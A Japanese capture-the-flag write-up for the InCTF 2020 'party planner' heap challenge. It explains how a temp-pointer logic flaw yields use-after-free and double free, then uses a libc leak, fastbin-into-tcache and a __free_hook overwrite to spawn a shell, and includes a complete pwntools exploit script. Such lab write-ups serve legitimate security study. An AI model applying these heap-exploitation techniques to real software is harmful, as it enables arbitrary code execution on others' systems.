---
tags: pwn
---

# InCTF 2020 - party planner

問題が含まれるリポジトリ: <https://github.com/teambi0s/InCTFi>

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

選択肢がクソ多いHeap問題。その上、ポインタの管理配列が変わったりすることがあり結構複雑
基本的にfree時にポインタが消されるが、消す際はインデックス指定なのに対し、一時変数(グローバル)に入っているポインタをfreeするという謎ロジックがあり、これを上手く使うと事前に別の選択肢でこの一時変数にセットしたポインタを置いて、クリアは別インデックスとすることが出来る。
したがってDouble FreeとUAF(read)がある。後者を使えばlibc leakは簡単に出来る。
残るはリンクリストの改竄だが、libc 2.29なのでtcacheでDouble Freeは出来ない。そこでtcacheを7つ埋めてからfastbinを利用する

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

* libc: 2.29
* 保持可能ポインタ: 20
* malloc可能サイズ: 0x30(固定), 0x500以下(自由)
* コマンド:
    1. create a house: house構造体(後述)を作る、`malloc(0x30)`と自由サイズmalloc
    2. create a person: person構造体(後述)を作る、`malloc(0x30)`と自由サイズmalloc
    3. add person to house: houseが管理する配列にpersonのポインタを格納、personの管理配列からは外れる
    4. remove person from house: houseで管理しているpersonをfreeする、ポインタクリア有り、既にfreeされているかのチェック有り
    5. view the house: houseの情報とhouseで管理しているpersonの情報を見る、personの説明はここでしか見ることが出来ない
    6. view a person: personの名前を見る、あるグローバル変数にpersonのポインタをセットする
    7. party: 指定houseで管理しているpersonを全部freeする、既にfreeされているかのチェック無し
    8. destroy house: houseをfreeする、管理しているpersonがあるなら出来ない
    9. give up: さようなら

1, 2で作られる構造体はだいたいこんな感じ(共にサイズは0x30)

```c
struct house {
    char name[0x20];
    person *people[size];
    char *desc;
}

struct person {
    char name[0x20];
    char *detail;
    bool in_house;
    uint idx_in_house;
}
```

最初に名前の入力を促され、0x20文字まで入れる事ができる。その後に説明を加えることが出来、その入力用に`malloc(size)`が走る。
この時作られた`house`と`person`はグローバル変数になっている配列で管理される。それぞれ上限は2, 20である

3の`add person to house`では`house->people`に指定した`person`のポインタを入れる。これは最大10人まで入る。
この時に`person`を管理しているグローバル配列から該当する`person`のポインタはクリアされ、`person->in_house`には1(True)が入る。

4の`remove person from house`では"通常は"`house->people[idx]`と`house->people[idx]->detail`をfreeする。この時にどちらのポインタもしっかりとfree後にクリアされるのでこのコマンドを連発してもDouble Freeは出来ない。しかし6の`view a parson`でも使うあるグローバル変数にpersonのポインタが入っているとそちらを優先してfreeする。その上、指定されたインデックスの方のポインタをクリアするので"6でポインタをセット -> 4で別インデックスを指定"することで6でセットしたポインタをクリアしないままfreeすることが出来る。
但し、`person->in_house`はしっかり0(false)に設定されてしまうので再びこのコマンドを実行してもDouble Freeが出来る訳ではない(7の`party`で解説)

5の`view the house`は`house`の情報を開示する。この時`house->people`中の`person`についても全部情報を開示し、`person->detail`はここでしか開示されない(6の`view a people`では名前しか開示されない)

6の`view a person`は`house->people`中にある`person`の`name`メンバだけを表示する。
実はshow機能としてこのコマンドを使うことは無く、4でも説明したグローバルな一時変数(以後、`tmp_p`とする)にポインタを入れる役目がある。
このコマンドで指定した`person`を指すポインタはこの`tmp_p`に入る。そしてそれは消されずに4でも使うことが出来、これが前述したようにDouble FreeやUAFに繋がっている。

7の`party`は指定した`house`で管理している`person`を全部freeする。この時、4とは違って`person->in_house`のチェックは起こらない。よって6 -> 4 -> 7の順でコマンドを叩くことでDouble Freeを引き起こすことが出来る

8の`destroy house`は指定`house`をfreeする。正直に言うと`__free_hook`書き換え直後に`free`する以外で使わなかったし、これも3を経る必要はあるが4でfreeが普通にできる

### libc leak

`person->detail`はサイズ可変なので0x420以上にしておけばfree時にUnsorted Binに送られる。上記のコマンドの説明のように6で一旦`tmp_p`に`detail`のサイズが0x420以上の`person`を配置し、4でこのインデックス以外の`person`を指定すれば`free(tmp_p)`されてもまだポインタは残っている。よって5の`view the house`で`detail`が開示され、ここには`main_arena.top`に対応するアドレスが入っていることからlibc leak出来る。

### Double Free

libc 2.29以降、tcacheでDouble Freeをすると検知されるのでfastbinを使う。fastbinなら先頭にあるチャンクでなければ複数回freeしても怒られない。
手順は上でも多少触れたがlibc leakの時同様に`tmp_p`を介してポインタを残したままfreeすることが出来る。ここで4で再びfreeしようと思ったが`person->in_house`が0になっているので残念ながらfree出来ない。そこで7の`party`を使って`house`にある全ての`parson`を指すポインタをfreeする際に巻き込む。
注意点として、libc leakで使ったチャンクは既にfreeされてUnsorted Binにあるのでこれと同じhouseにあるとそちらでDouble Freeが検知されて死ぬ。よって`party`で指定する`house`はlibc leakで使ったチャンクを有していない方にする必要がある(事前に`person->detail`のmallocでUnsorted Binを空にしておけばよいが面倒だった)
これでfastbinは2度freeしたチャンクを`A`とおいて`A -> B -> A -> ...`のような形になる。

### fastbin reverse into tcache

今回はcallocが無いのでtcacheが存在している時にfastbinを利用することが出来ない。そこでまずは一旦tcacheに蓄えているチャンクを全部吐き出す為に`create a person`を7回叩く。そして次に叩くとfastbinの先頭から1つ取った上で残りのチャンクを入るだけtcacheへ入れる。
どういう理屈なのかは(この前glibcのmalloc.cのfastninの部分を読んだのに)忘れたが、事前にfastbinをA -> B -> Aのように巡回させていても上手く入ってくれる。
というわけで巡回するtcacheが出来たので後はtcache poisoningで`__free_hook`を書き換えるだけである

### いつもの

`A -> B -> A`のようになっていたところから`A`を取って編集したので`B, A`の2つを取ることと、`person`構造体用にmallocされる0x40のtcacheでSIGSEGVを起こさないように気をつけていれば特に言うことは無い、後者は、0x40のチャンクを余分にfreeすることで対策した。`__free_hook`に`system`のアドレスを入れ、事前に`house->name`に`"/bin/sh"`を入れていたので`destroy_house`を叩いてシェルを起動した

## Code

2.29用のデバッグシンボル付きlibc用意するのが面倒だったので2.31で解いてます

```python
from pwn import p64, u64, ELF, process, remote
from xlog import XLog


logger = XLog("EXPLOIT")


# you need filling this variables
PROMPT_CHAR = "Choice >> "

def select(s, sel, c=PROMPT_CHAR):
    if sel is None or c is None:
        logger.warning("please fill above variables")
        exit(-1)
    s.recvuntil(c)
    s.sendline(str(sel))


def create_house(s, name, size, desc):
    select(s, 1)
    s.recvuntil(" : ")
    s.sendline(name)
    s.recvuntil(" : ")
    s.sendline(str(size))
    s.recvuntil(" : ")
    s.sendline(desc)


def create_person(s, name, size, detail):
    select(s, 2)
    s.recvuntil(" : ")
    s.sendline(name)
    s.recvuntil(" : ")
    s.sendline(str(size))
    s.recvuntil(" : ")
    s.sendline(detail)


def add_person(s, person_idx, house_idx):
    select(s, 3)
    s.recvuntil(" : ")
    s.sendline(str(person_idx))
    s.recvuntil(" : ")
    s.sendline(str(house_idx))


# delete
def remove_person(s, house_idx, person_idx):
    select(s, 4)
    s.recvuntil(" : ")
    s.sendline(str(house_idx))
    s.recvuntil(" : ")
    s.sendline(str(person_idx))


# leak
def view_house(s, house_idx):
    select(s, 5)
    s.recvuntil(" : ")
    s.sendline(str(house_idx))
    s.recvuntil("with details  ")
    return u64(s.recvline().rstrip().ljust(8, b"\x00"))


# set tmp_p
def view_person(s, house_idx, person_idx):
    select(s, 6)
    s.recvuntil(" : ")
    s.sendline(str(house_idx))
    s.recvuntil(" : ")
    s.sendline(str(person_idx))


# free all person
def party(s, house_idx):
    select(s, 7)
    s.recvuntil(" : ")
    s.sendline(str(house_idx))


def destroy_house(s, house_idx):
    select(s, 8)
    s.recvuntil(" : ")
    s.sendline(str(house_idx))


if __name__ == "__main__":
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    elf = ELF("party")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    free_hook_libc = libc.symbols["__free_hook"]
    malloc_hook_libc = libc.symbols["__malloc_hook"]
    system_libc = libc.symbols["system"]
    one_gadgets = []
    main_arena_top = 0x1ebbe0

    # s = process(["./ld-linux-x86-64.so.2", elf.path], env={"LD_PRELOAD": libc.path})
    s = process(elf.path)

    create_house(s, "0", 0x18, "0")
    create_house(s, "/bin/sh", 0x18, "/bin/sh")
    create_person(s, "qwer", 0x18, "first freed")   # 0
    create_person(s, "qwer", 0x418, "large")  # 1
    
    # chunks for filling tcache
    for i in range(2, 12):
        create_person(s, str(i), 0x18, "fill tcache")

    create_person(s, "aaa", 0x38, "avoid sigsegv")  # 13

    for i in range(0, 10):
        add_person(s, i, 0)
    
    for i in range(10, 13):
        add_person(s, i, 1)

    view_person(s, 0, 1)
    remove_person(s, 0, 0)

    for i in range(2, 9):
        remove_person(s, 0, i)

    view_person(s, 1, 1)    # set person 11 to tmp_p
    remove_person(s, 1, 0)  # person 11 is freed
    remove_person(s, 0, 9)
    party(s, 1)
    # destroy_house(s, 1)

    libc_addr = view_house(s, 0) - main_arena_top
    logger.libc(libc_addr)

    for i in range(7):
        create_person(s, str(i), 0x18, "empty tcache")

    # fastbin reverse into tcache
    create_person(s, "/bin/sh", 0x18, p64(libc_addr + free_hook_libc))
    create_person(s, "/bin/sh", 0x18, "/bin/sh")
    create_person(s, "/bin/sh", 0x18, "/bin/sh")
    create_person(s, "/bin/sh", 0x18, p64(libc_addr + system_libc))

    destroy_house(s, 1)

    s.interactive()

```

## Flag

鯖が生きていたらやろうとしたけど生きていなかったのでローカルシェル取り太郎です、当日は起きたらチームメイトが瞬殺してました(俺の為に残すか迷っていたらしい)

## 感想

やたらとコマンドが多いのと、脆弱性部分がちょっと複雑なところ以外は2.29以降のfastbinからtcacheにチャンクを入れようとする問題と同じです(ex. [\*CTF 2019 - girlfriend](/@Xornet/ry6Pq7zkD))
glibc自体のセキュリティ機構がバージョン毎に強くなっているので脆弱性の隠し方を複雑にするか、tcacheへ戻る挙動を悪用する問題が増えそうな気がします
2.32でPartial Overwrite系が全滅しそうなので楽しみ(ではない)です

## 参考文献

* [how2heap/fastbin_reverse_into_tcache.c - github](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/fastbin_reverse_into_tcache.c): いつもの